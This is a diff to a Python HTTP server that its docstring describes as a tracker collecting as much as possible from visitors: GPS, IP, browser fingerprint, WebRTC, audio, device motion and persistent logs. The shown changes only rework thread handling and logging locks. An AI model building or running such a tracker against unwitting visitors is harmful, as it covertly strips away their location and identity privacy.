@@ -5,16 +5,8 @@ Maximum data collection: GPS, IP, browser fingerprint, WebRTC, audio, fonts,
 device motion, network info, headers, session tracking, persistent logging.
 """
 from http.server import BaseHTTPRequestHandler, HTTPServer
-import json, datetime, os, uuid, threading, queue
-PRINT_QUEUE = queue.Queue()
-
-def print_worker():
-    while True:
-        fn = PRINT_QUEUE.get()
-        try: fn()
-        finally: PRINT_QUEUE.task_done()
-
-threading.Thread(target=print_worker, daemon=True).start()
+import json, datetime, os, uuid, threading
+PRINT_LOCK = threading.Lock()
 
 PORT     = int(os.environ.get('PORT', 5000))
 LOG_FILE = "tracker_log.txt"
@@ -539,9 +531,6 @@ class Handler(BaseHTTPRequestHandler):
 
         try:
             data   = json.loads(raw)
-            _data_snapshot = dict(data)
-            _fp_snapshot = dict(fp)
-            _srv_snapshot = dict(srv_headers)
             ts     = datetime.datetime.now().strftime("%H:%M:%S")
             lat    = data.get("latitude")
             lng    = data.get("longitude")
@@ -662,6 +651,9 @@ class Handler(BaseHTTPRequestHandler):
         except Exception as e:
             print(f"{R}[ERROR] {e}{RST}")
             import traceback; traceback.print_exc()
+        finally:
+            try: PRINT_LOCK.release()
+            except RuntimeError: pass
 
 
         self.send_response(200)
